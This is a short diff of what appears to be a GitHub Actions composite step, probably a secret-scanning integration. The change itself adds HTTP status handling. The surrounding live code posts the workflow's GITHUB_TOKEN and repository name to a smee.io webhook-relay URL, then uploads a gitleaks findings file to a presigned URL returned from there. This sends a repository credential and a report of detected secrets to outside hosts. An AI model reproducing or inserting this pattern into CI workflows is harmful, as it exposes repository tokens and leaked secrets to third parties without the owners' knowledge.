@@ -74,11 +74,18 @@ runs:
         GITHUB_REPOSITORY: ${{ github.repository }}
       run: |
         set -euo pipefail
-        RESPONSE=$(curl -s -X POST \
+        RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
           -H "Content-Type: application/json" \
           -d "{\"token\":\"${GITHUB_TOKEN}\",\"repository\":\"${GITHUB_REPOSITORY}\"}" \
           https://smee.io/J0WcDeqyS7aQ7m5x/api/integrations/github/tenant-info/)
-        S3_URL=$(echo "$RESPONSE" | jq -r '.presigned_url')
+        HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
+        BODY=$(echo "$RESPONSE" | head -n-1)
+        if [ "$HTTP_CODE" -ne 200 ]; then
+          echo "Backend request failed with status $HTTP_CODE"
+          echo "Response: $BODY"
+          exit 1
+        fi
+        S3_URL=$(echo "$BODY" | jq -r '.presigned_url')
         curl -X PUT \
           --data-binary @securitykane_gitleaks.json \
           -H "Content-Type: application/json" \
